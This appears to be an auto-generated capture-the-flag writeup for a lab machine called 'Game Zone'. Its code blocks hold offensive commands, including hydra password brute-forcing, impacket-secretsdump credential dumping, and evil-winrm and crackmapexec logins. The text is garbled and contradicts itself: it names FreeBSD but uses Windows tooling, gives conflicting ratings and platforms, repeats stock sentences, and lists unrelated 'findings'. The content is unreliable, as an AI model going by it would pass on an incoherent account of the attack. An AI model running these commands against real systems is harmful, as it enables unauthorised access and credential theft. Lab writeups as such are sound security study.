---
TitleSEO: "VulnHub — Game Zone (Insane FreeBSD) | ZureFX"
TitlePost: "VulnHub — Game Zone (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Game Zone. Sudo Misconfiguration and SeImpersonatePrivilege to achieve insane compromise on FreeBSD."
Keywords: "medium, reversing, hackthebox, windows, linux"
URL: "https://zurefx.github.io/writeups/htb-game-zone-648.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-game-zone-648/"
Date: "2025-06-26"
Tags: "Medium, Reversing, HackTheBox, Windows, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-game-zone-648"
Permalink: "/writeups/htb-game-zone-648.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Game Zone** is rated **Insane** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.111.117.215`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.82.146.72/FUZZ
evil-winrm -i 10.79.189.140 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
evil-winrm -i 10.81.93.119 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.55.3.1 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.70.234.241 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.68.220.192/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **Sudo Misconfiguration**.

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.108.164.22 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
nmap -sCV -p8080,993,27017 10.124.205.184 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.187.247
feroxbuster -h
feroxbuster -h
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
crackmapexec smb 10.81.60.130 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.61.79.86 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.74.239.241 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.68.33.107 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

## Summary

### Tools Used

- `metasploit`
- `pwncat`
- `netcat`
- `atexec`
- `wmiexec`

### Key Takeaways

- Sudo Misconfiguration
- SeImpersonatePrivilege
- XXE
- Resource-Based Constrained Delegation
